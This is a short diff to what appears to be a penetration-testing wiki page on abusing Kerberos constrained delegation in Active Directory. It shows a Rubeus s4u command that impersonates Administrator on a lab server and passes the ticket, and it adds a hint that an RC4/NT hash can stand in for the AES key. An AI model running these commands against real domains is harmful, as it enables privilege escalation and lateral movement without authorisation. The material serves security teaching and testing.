@@ -59,6 +59,8 @@ Example:
 .\Rubeus.exe s4u /user:MACHINE01$ /aes256:<machine01_aes> /impersonateuser:Administrator /msdsspn:"CIFS/srv01.adlab.local" /altservice:HOST,HTTP /ptt
 ```
 
+> **HINT**: Instead of `/aes256` use can use `/rc4` parameter and provide RC4/NT hash as well.
+
 Now we should be able to access `srv01.adlab.local` using [WinRM](/windows-lateral-movement/winrm) (`HOST,HTTP` services) as `Administrator` user.
 
 ## Enumerate machines and users with Constrained Delegation
